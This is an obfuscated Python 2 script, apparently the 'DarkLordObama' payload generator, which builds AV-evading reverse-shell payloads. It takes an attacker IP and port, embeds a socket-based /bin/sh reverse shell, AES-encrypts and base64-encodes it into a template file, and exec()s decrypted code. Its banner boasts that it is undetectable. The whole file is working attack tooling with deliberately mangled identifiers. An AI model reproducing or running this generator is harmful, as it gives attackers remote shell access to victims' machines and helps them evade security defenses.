#!/usr/bin/python
# -*- coding: utf-8 -*-
if 64 - 64: i11iIiiIii
if 65 - 65: O0 / iIii1I11I1II1 % OoooooooOO - i1IIi
if 73 - 73: II111iiii
if 22 - 22: I1IiiI * Oo0Ooo / OoO0O00 . OoOoOO00 . o0oOOo0O0Ooo / I1ii11iIi11i
if 48 - 48: oO0o / OOooOOo / I11i / Ii1I
import re , random , string , Crypto , binascii , base64 , sys , os , time , subprocess
from Crypto . Cipher import AES
from binascii import hexlify
from base64 import b64decode , b64encode
if 48 - 48: iII111i % IiII + I1Ii111 / ooOoO0o * Ii1I
if 46 - 46: ooOoO0o * I11i - OoooooooOO
II1iII1i = [ ]
def oO0oIIII ( arrayBrokenShellCode , toFill ) :
 for Oo0oO0oo0oO00 in range ( 0 , toFill ) :
  arrayBrokenShellCode . append ( "aa" )
 return arrayBrokenShellCode
def i111I ( l ) :
 II1Ii1iI1i = re . findall ( '..?' , l )
 iiI1iIiI = list ( II1Ii1iI1i )
 OOo = 50 - len ( II1Ii1iI1i )
 II1Ii1iI1i = oO0oIIII ( II1Ii1iI1i , OOo )
 Ii1IIii11 = random . sample ( II1Ii1iI1i , len ( II1Ii1iI1i ) )
 for Oo0oO0oo0oO00 in Ii1IIii11 :
  if Oo0oO0oo0oO00 == 'aa' or None :
   Oooo0000 = '' . join ( random . choice ( string . ascii_lowercase ) for Oo0oO0oo0oO00 in range ( 2 ) )
   Ii1IIii11 [ Ii1IIii11 . index ( Oo0oO0oo0oO00 ) ] = Oooo0000
 return Ii1IIii11 , iiI1iIiI
i11 = [ ]
def I11 ( arrayBSOrig , arrayShuffled ) :
 for Oo0o0000o0o0 in arrayBSOrig :
  oOo0oooo00o = arrayShuffled . index ( Oo0o0000o0o0 )
  i11 . append ( oOo0oooo00o )
 return i11
def oO0o0o0ooO0oO ( arrayShuffled , scmap ) :
 oo0o0O00 = ""
 for oO in scmap :
  oo0o0O00 += arrayShuffled [ oO ]
 oo0o0O00 = oo0o0O00 . strip ( ) . rstrip ( )
 if 34 - 34: I11i * I1IiiI
 exec ( oo0o0O00 )
 return oo0o0O00
 if 31 - 31: II111iiii + OoO0O00 . I1Ii111
def OoOooOOOO ( arrayBSOrig ) :
 i11iiII = [ ]
 for I1iiiiI1iII in arrayBSOrig :
  oo0o0O00 = ""
  try :
   oo0o0O00 = "" . join ( I1iiiiI1iII )
   i11iiII . append ( oo0o0O00 )
  except :
   pass
   if 20 - 20: i1IIi + i11iIiiIii - Ii1I % OoO0O00 . OoooooooOO
 for Oo in i11iiII :
  oo0o0O00 = Oo
  if 85 - 85: OOooOOo % I1ii11iIi11i * ooOoO0o
  exec ( oo0o0O00 )
 return
 if 90 - 90: o0oOOo0O0Ooo % o0oOOo0O0Ooo % I11i * OoOoOO00
def i1IIiiiii ( size = 32 , chars = string . ascii_uppercase + string . digits ) :
 return '' . join ( random . choice ( chars ) for x in range ( size ) )
 if 55 - 55: i1IIi
def OO ( size = 16 , chars = string . ascii_lowercase + string . digits ) :
 return '' . join ( random . choice ( chars ) for x in range ( size ) )
def oO0O ( shellcommands , key , IV ) :
 OOoO000O0OO = AES . new ( key , AES . MODE_CFB , IV )
 iiI1IiI = OOoO000O0OO . encrypt ( shellcommands )
 if 13 - 13: Oo0Ooo . i11iIiiIii - iIii1I11I1II1 - OoOoOO00
 return iiI1IiI
 if 6 - 6: I1IiiI / Oo0Ooo % Ii1I
def oo ( ciphertext , key , IV ) :
 OO0O00 = AES . new ( key , AES . MODE_CFB , IV )
 ii1 = OO0O00 . decrypt ( ciphertext )
 if 57 - 57: Ii1I % OoooooooOO
 return ii1
 if 61 - 61: iII111i . iIii1I11I1II1 * I1IiiI . ooOoO0o % Oo0Ooo
def oOo00Oo00O ( l_encrypted ) :
 iI11i1I1 = l_encrypted
 o0o0OOO0o0 = 'payload.txt'
 ooOOOo0oo0O0 = open ( o0o0OOO0o0 , 'w+' )
 ooOOOo0oo0O0 . write ( iI11i1I1 )
 ooOOOo0oo0O0 . close ( )
 if 71 - 71: I1Ii111 . O0
 return o0o0OOO0o0
 if 73 - 73: OOooOOo % OoOoOO00 - Ii1I
def iiIIII1i1i ( payload , decryptKey , decryptIV ) :
 iiI1 = open ( payload , 'r+' )
 i11Iiii = iiI1 . read ( )
 iiI1 . close ( )
 I1iiiiI1iII = oo ( i11Iiii , decryptKey , decryptIV )
 iI = I1iiiiI1iII . splitlines ( )
 if 28 - 28: OOooOOo - IiII . IiII + OoOoOO00 - OoooooooOO + O0
 return iI
 if 95 - 95: OoO0O00 % oO0o . O0
 if 15 - 15: ooOoO0o / Ii1I . Ii1I - i1IIi
o00oOO0 = """
# DarkLordObama: Undetectable (as of July 28th, 2019) Pythonic Payload Generator
# Author: Chang Tan Lister
# Product of Lister Unlimited Cybersecurity Solutions, LLC
# Services provided: Low-interest loans to Cybersecurity/IT Companies, Securities-Trading (Corporate Bonds), Penetration Tests, Cyber Liability Coverage Plans (Requires pentest before a quote can be devised)
# 702-886-8952
"""
print o00oOO0
if len ( sys . argv ) < 3 :
 print "Usage\r\npython generator.py <IPAddr> <Port>"
 exit ( 0 )
else :
 oOoo = str ( sys . argv [ 1 ] )
 iIii11I = int ( sys . argv [ 2 ] )
 if 69 - 69: oO0o % I1Ii111 - o0oOOo0O0Ooo + I1Ii111 - O0 % OoooooooOO
Iii111II = """
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{}",{}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
""" . format (
 str ( oOoo ) ,
 int ( iIii11I )
 )
iiii11I = time . strftime ( "%Y%m%d-%H%M%S" )
Ooo0OO0oOO = "darklordobama_{}.py" . format ( str ( iiii11I ) )
Iii111II = Iii111II . strip ( ) . rstrip ( )
if 50 - 50: I1IiiI
def Ii1i11IIii1I ( code , l_encrypted , decryptKey , decryptIV , outfile = Ooo0OO0oOO ) :
 oo0o0O00 = "touch {}" . format ( str ( outfile ) )
 subprocess . call ( oo0o0O00 , shell = True , executable = '/bin/bash' )
 iI11i1I1 = b64encode ( l_encrypted )
 ooOOOo0oo0O0 = open ( outfile , 'wb+' )
 Oo = code . splitlines ( )
 for OOOoO0O0o in Oo :
  if 55 - 55: OOooOOo + ooOoO0o . i1IIi - I1ii11iIi11i . O0 - ooOoO0o
  if 'key=' in OOOoO0O0o :
   o0O = 'key="""{}"""' . format ( str ( decryptKey ) )
   OOOoO0O0o = OOOoO0O0o . replace ( 'key=' , o0O )
   if 72 - 72: iII111i / i1IIi * Oo0Ooo - I1Ii111
  if 'iv=' in OOOoO0O0o :
   Oo0O0O0ooO0O = 'iv="""{}"""' . format ( str ( decryptIV ) )
   OOOoO0O0o = OOOoO0O0o . replace ( 'iv=' , Oo0O0O0ooO0O )
   if 15 - 15: I1ii11iIi11i + OoOoOO00 - OoooooooOO / OOooOOo
  if 'pld=' in OOOoO0O0o :
   oo000OO00Oo = 'pld=str("""'
   O0OOO0OOoO0O = "{}" . format ( str ( iI11i1I1 ) )
   O00Oo000ooO0 = '""")'
   OoO0O00IIiII = """
{}
{}
{}
            """ . format (
 str ( oo000OO00Oo ) ,
 str ( O0OOO0OOoO0O ) ,
 str ( O00Oo000ooO0 )
 )
   OOOoO0O0o = OOOoO0O0o . replace ( 'pld=' , OoO0O00IIiII )
   if 80 - 80: IiII . oO0o
  ooOOOo0oo0O0 . write ( '\r\n' + OOOoO0O0o )
  if 25 - 25: OoOoOO00 . II111iiii / iII111i . OOooOOo * OoO0O00 . I1IiiI
 ooOOOo0oo0O0 . close ( )
 oo0o0O00 = "ls $PWD/{}" . format ( str ( outfile ) )
 Oo0oOOo = subprocess . Popen ( oo0o0O00 , shell = True , executable = '/bin/bash' , stdout = subprocess . PIPE , stderr = subprocess . PIPE )
 Oo0OoO00oOO0o = str ( Oo0oOOo . stdout . read ( ) . encode ( 'utf-8' ) ) . strip ( ) . rstrip ( )
 if 80 - 80: oO0o + OOooOOo - OOooOOo % iII111i
 print "Payload saved at:\r\n{}" . format ( str ( Oo0OoO00oOO0o ) )
 return outfile
def OoOO0oo0o ( template = "./payload_template.py" ) :
 iiI1 = open ( template , 'rb+' )
 II11i1I11Ii1i = iiI1 . read ( )
 iiI1 . close ( )
 return II11i1I11Ii1i
def O000O0oOO0 ( ) :
 O0ooo0O0oo0 = i1IIiiiii ( )
 oo0oOo = OO ( )
 II11i1I11Ii1i = OoOO0oo0o ( )
 o000O0o = oO0O ( Iii111II , O0ooo0O0oo0 , oo0oOo )
 iI1iII1 = Ii1i11IIii1I ( II11i1I11Ii1i , o000O0o , O0ooo0O0oo0 , oo0oOo , outfile = Ooo0OO0oOO )
 o0o0OOO0o0 = oOo00Oo00O ( o000O0o )
 iI11i1I1 = b64encode ( o000O0o )
 if 86 - 86: OOooOOo
 iI = iiIIII1i1i ( o0o0OOO0o0 , O0ooo0O0oo0 , oo0oOo )
 if 55 - 55: Oo0Ooo + iIii1I11I1II1 / OoOoOO00 * oO0o - i11iIiiIii - Ii1I
 if 25 - 25: I1ii11iIi11i
 for Ii1i in iI :
  Ii1IIii11 , iiI1iIiI = i111I ( Ii1i )
  i11 = I11 ( iiI1iIiI , Ii1IIii11 )
  if 15 - 15: IiII . iIii1I11I1II1 . OoooooooOO / i11iIiiIii - Ii1I . i1IIi
  for Ii1i in iI :
   i1 = re . findall ( '..?' , Ii1i )
   if 53 - 53: Ii1I + iIii1I11I1II1 - I1Ii111 - Ii1I . IiII
   oo0o0O00 = "" . join ( i1 )
   if 53 - 53: O0 * OoO0O00 + OOooOOo
   exec ( oo0o0O00 )
 return
O000O0oOO0 ( )
# dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
